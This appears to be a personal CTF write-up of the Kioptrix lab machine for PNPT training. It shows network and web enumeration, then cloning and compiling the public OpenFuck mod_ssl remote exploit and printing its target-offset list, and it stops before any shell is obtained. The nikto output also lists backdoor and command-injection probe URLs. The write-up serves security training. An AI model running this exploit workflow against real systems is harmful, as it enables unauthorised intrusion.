---
title: Write-up Kioptrix on TCM
author: eMVee
date: 2023-12-20 17:00:00 +0800
categories: [CTF, TCM]
tags: [PNPT, samba]
render_with_liquid: false
---

I am currently completing all the courses for the PNPT exam. One of the training courses is [Practical Ethical Hacking by TCM Security](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course). A training focused on practical skills in which theory is put into practice. A Kioptrix machine has been made available for practice. This name does ring a bell, because it is also on [Vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/). After importing the machine into my lab it's time to get started.

## Getting started
Before we start with any enumeration we should create a project directory. In this directory we can store any files, exploits etc.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/       

┌──(emvee㉿kali)-[~/Documents]
└─$ mkdir kioptrix

┌──(emvee㉿kali)-[~/Documents]
└─$ cd kioptrix 
```
After creating our project directory we should check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:aa:f7:1f brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.5/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 469sec preferred_lft 469sec
    inet6 fe80::a00:27ff:feaa:f71f/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:41:5a:bb:89 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-c3199b3ee524: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a1:ae:fd:79 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-c3199b3ee524
       valid_lft forever preferred_lft forever


```
We can discover hosts on the network with netdiscover. Let's identify some hosts on the virtual network.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ sudo netdiscover -r 10.0.2.0/24 
 Currently scanning: Finished!   |   Screen View: Unique Hosts                           
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor                        
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor                        
 10.0.2.3        08:00:27:7b:8b:2b      1      60  PCS Systemtechnik GmbH                
 10.0.2.4        08:00:27:b2:da:51      1      60  PCS Systemtechnik GmbH 
```
Assign the IP address to a variable so we can use commands from our cheat sheet.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ ip=10.0.2.4   
```
Let's see if the target is responding to a ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ ping -c3 $ip           
PING 10.0.2.4 (10.0.2.4) 56(84) bytes of data.
64 bytes from 10.0.2.4: icmp_seq=1 ttl=255 time=0.229 ms
64 bytes from 10.0.2.4: icmp_seq=2 ttl=255 time=0.221 ms
64 bytes from 10.0.2.4: icmp_seq=3 ttl=255 time=0.310 ms

--- 10.0.2.4 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2058ms
rtt min/avg/max/mdev = 0.221/0.253/0.310/0.040 ms

```
Normally I would predict what kind of operating system is used based on the TTL value. This time it has the value `255` what normally is seen in a response of a router or load balancer. 

## Enumeration
Let's find out what ports are open and what kind of services are running on our target.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ sudo nmap -sC -sV $ip -p- -T4 -A
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-20 11:50 CET
Nmap scan report for 10.0.2.4
Host is up (0.00023s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
|_ssl-date: 2023-12-20T15:51:07+00:00; +5h00m01s from scanner time.
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:B2:DA:51 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 5h00m00s

TRACEROUTE
HOP RTT     ADDRESS
1   0.23 ms 10.0.2.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds

```
We did discover a lot of information with nmap. We should take some notes on this.
- Linux, probably a Red-Hat version
- Port 22
	- SSH
	- OpenSSH 2.9p2
- Port 80
	- HTTP
	- Apache 1.3.20 
		- mod_ssl/2.8.4 OpenSSL/0.9.6b)
	- Title: Test Page for the Apache Web Server on Red Hat Linux
- Port 111
	- RPC
- Port 139
	- SMB
	- Samba
	- Workgroup: MYGROUP
- Port 443
	- HTTPS
	- Apache 1.3.20 
		- mod_ssl/2.8.4 OpenSSL/0.9.6b)
	- Title: Test Page for the Apache Web Server on Red Hat Linux
- Port 32768
	- RPC

With whatweb we can try to identify other technologies on this web service.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ whatweb $ip
http://10.0.2.4 [200 OK] Apache[1.3.20][mod_ssl/2.8.4], Country[RESERVED][ZZ], Email[webmaster@example.com], HTTPServer[Red Hat Linux][Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], IP[10.0.2.4], OpenSSL[0.9.6b], Title[Test Page for the Apache Web Server on Red Hat Linux]
```
We can use searchsploit to see if there are exploits available for the `mod_ssl` module.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ searchsploit mod_ssl
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Service                                 | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                      | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow            | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)      | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)      | unix/remote/47080.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY | unix/remote/40347.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
Let's keep this exploit in mind. We should check the website as well in the browser.
![Image](/assets/img/WriteUp/PNPT/Kioptrix/Pasted image 20231220151112.png){: width="700" height="400" }

There is some interesting information on this page what we should add to our notes:
- Red Hat Linux 6.2
- `/var/www`

We can utilize nikto to see if there are any other vulnerabilities what we should investigate.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ nikto -h http://$ip
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        80
+ Start Time:         2023-12-20 15:13:02 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 05:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /test.php: This might be interesting.
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2023-12-20 15:13:20 (GMT1) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```
Nikto mentioned multiple vulnerabilities as well as remote code execution. Based on the searchsploit OpenFuck exploit we should do a bit of research on this. We can search for example for am exploit available on Github as well.
```
https://www.google.com/search?q=openfuck+exploit+github
```
Based on the Google results I opened the Github of `heltonWernik`.

```
https://github.com/heltonWernik/OpenLuck
```

Based on the description we can clone the exploit to our machine and start following the exploit description.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ git clone https://github.com/heltonWernik/OpenFuck.git
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Receiving objects: 100% (26/26), 14.14 KiB | 1.18 MiB/s, done.
Resolving deltas: 100% (6/6), done.

```
We have to install `libssl-dev` with sudo permissions.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ sudo apt-get install libssl-dev 
[sudo] password for emvee: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libssl3 openssl
Suggested packages:
  libssl-doc
The following NEW packages will be installed:
  libssl-dev
The following packages will be upgraded:
  libssl3 openssl
2 upgraded, 1 newly installed, 0 to remove and 1923 not upgraded.
Need to get 5863 kB of archives.
After this operation, 12.8 MB of additional disk space will be used.
Do you want to continue? [Y/n] y

```
Change the working directory so we can compile the files.
```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix]
└─$ cd OpenFuck
```
Now we should compile the source code to a binary.
```
┌──(emvee㉿kali)-[~/Documents/kioptrix/OpenFuck]
└─$ gcc -o OpenFuck OpenFuck.c -lcrypto
OpenFuck.c: In function ‘read_ssl_packet’:
OpenFuck.c:866:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  866 |                 RC4(ssl->rc4_read_key, rec_len, buf, buf);
      |                 ^~~
In file included from OpenFuck.c:24:
/usr/include/openssl/rc4.h:37:28: note: declared here
   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,
      |                            ^~~
OpenFuck.c: In function ‘send_ssl_packet’:
OpenFuck.c:915:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  915 |                 MD5_Init(&ctx);
      |                 ^~~~~~~~
In file included from OpenFuck.c:25:
/usr/include/openssl/md5.h:49:27: note: declared here
   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);
      |                           ^~~~~~~~
OpenFuck.c:916:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  916 |                 MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:917:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  917 |                 MD5_Update(&ctx, rec, rec_len);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:918:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  918 |                 MD5_Update(&ctx, &seq, 4);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:919:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  919 |                 MD5_Final(p, &ctx);
      |                 ^~~~~~~~~
/usr/include/openssl/md5.h:51:27: note: declared here
   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
      |                           ^~~~~~~~~
OpenFuck.c:926:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  926 |                 RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
      |                 ^~~
/usr/include/openssl/rc4.h:37:28: note: declared here
   37 | OSSL_DEPRECATEDIN_3_0 void RC4(RC4_KEY *key, size_t len,
      |                            ^~~
OpenFuck.c: In function ‘send_client_master_key’:
OpenFuck.c:1081:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1081 |         if (EVP_PKEY_get1_RSA(pkey) == NULL) {
      |         ^~
In file included from /usr/include/openssl/x509.h:29,
                 from /usr/include/openssl/ssl.h:31,
                 from OpenFuck.c:19:
/usr/include/openssl/evp.h:1348:16: note: declared here
 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);
      |                ^~~~~~~~~~~~~~~~~
OpenFuck.c:1088:9: warning: ‘RSA_public_encrypt’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1088 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
      |         ^~~~~~~~~~~~~~~~~~~~
In file included from /usr/include/openssl/x509.h:36:
/usr/include/openssl/rsa.h:282:5: note: declared here
  282 | int RSA_public_encrypt(int flen, const unsigned char *from, unsigned char *to,
      |     ^~~~~~~~~~~~~~~~~~
OpenFuck.c:1088:9: warning: ‘EVP_PKEY_get1_RSA’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1088 |         encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);
      |         ^~~~~~~~~~~~~~~~~~~~
/usr/include/openssl/evp.h:1348:16: note: declared here
 1348 | struct rsa_st *EVP_PKEY_get1_RSA(EVP_PKEY *pkey);
      |                ^~~~~~~~~~~~~~~~~
OpenFuck.c: In function ‘generate_key_material’:
OpenFuck.c:1125:17: warning: ‘MD5_Init’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1125 |                 MD5_Init(&ctx);
      |                 ^~~~~~~~
/usr/include/openssl/md5.h:49:27: note: declared here
   49 | OSSL_DEPRECATEDIN_3_0 int MD5_Init(MD5_CTX *c);
      |                           ^~~~~~~~
OpenFuck.c:1127:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1127 |                 MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:1128:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1128 |                 MD5_Update(&ctx,&c,1);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:1130:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1130 |                 MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:1131:17: warning: ‘MD5_Update’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1131 |                 MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
      |                 ^~~~~~~~~~
/usr/include/openssl/md5.h:50:27: note: declared here
   50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
OpenFuck.c:1132:17: warning: ‘MD5_Final’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1132 |                 MD5_Final(km,&ctx);
      |                 ^~~~~~~~~
/usr/include/openssl/md5.h:51:27: note: declared here
   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
      |                           ^~~~~~~~~
OpenFuck.c: In function ‘generate_session_keys’:
OpenFuck.c:1141:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1141 |         RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
      |                            ^~~~~~~~~~~
OpenFuck.c:1145:9: warning: ‘RC4_set_key’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
 1145 |         RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
      |     
```

------
## Initial access


```bash
┌──(emvee㉿kali)-[~/Documents/kioptrix/OpenFuck]
└─$ ./OpenFuck 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x03 - Cobalt Sun x (apache-1.3.26)
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
        0x05 - Conectiva 4 (apache-1.3.6)
        0x06 - Conectiva 4.1 (apache-1.3.9)
        0x07 - Conectiva 6 (apache-1.3.14)
        0x08 - Conectiva 7 (apache-1.3.12)
        0x09 - Conectiva 7 (apache-1.3.19)
        0x0a - Conectiva 7/8 (apache-1.3.26)
        0x0b - Conectiva 8 (apache-1.3.22)
        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
        0x0d - Debian GNU Linux (apache_1.3.19-1)
        0x0e - Debian GNU Linux (apache_1.3.22-2)
        0x0f - Debian GNU Linux (apache-1.3.22-2.1)
        0x10 - Debian GNU Linux (apache-1.3.22-5)
        0x11 - Debian GNU Linux (apache_1.3.23-1)
        0x12 - Debian GNU Linux (apache_1.3.24-2.1)
        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
        0x14 - Debian GNU Linux (apache_1.3.24-3)
        0x15 - Debian GNU Linux (apache-1.3.26-1)
        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
        0x17 - Debian GNU Linux (apache-1.3.27)
        0x18 - FreeBSD (apache-1.3.9)
        0x19 - FreeBSD (apache-1.3.11)
        0x1a - FreeBSD (apache-1.3.12.1.40)
        0x1b - FreeBSD (apache-1.3.12.1.40)
        0x1c - FreeBSD (apache-1.3.12.1.40)
        0x1d - FreeBSD (apache-1.3.12.1.40_1)
        0x1e - FreeBSD (apache-1.3.12)
        0x1f - FreeBSD (apache-1.3.14)
        0x20 - FreeBSD (apache-1.3.14)
        0x21 - FreeBSD (apache-1.3.14)
        0x22 - FreeBSD (apache-1.3.14)
        0x23 - FreeBSD (apache-1.3.14)
        0x24 - FreeBSD (apache-1.3.17_1)
        0x25 - FreeBSD (apache-1.3.19)
        0x26 - FreeBSD (apache-1.3.19_1)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x2b - FreeBSD (apache-1.3.22)
        0x2c - FreeBSD (apache-1.3.22_7)
        0x2d - FreeBSD (apache_fp-1.3.23)
        0x2e - FreeBSD (apache-1.3.24_7)
        0x2f - FreeBSD (apache-1.3.24+2.8.8)
        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
        0x32 - FreeBSD (apache-1.3.27)
        0x33 - Gentoo Linux (apache-1.3.24-r2)
        0x34 - Linux Generic (apache-1.3.14)
        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
        0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
        0x42 - Mandrake Linux 8.2 (apache-1.3.24)
        0x43 - Mandrake Linux 9 (apache-1.3.26)
        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
        0x5b - Redhat Linux 7.x (apache-1.3.22)
        0x5c - RedHat Linux 7.x (apache-1.3.26-1)
        0x5d - RedHat Linux 7.x (apache-1.3.27)
        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
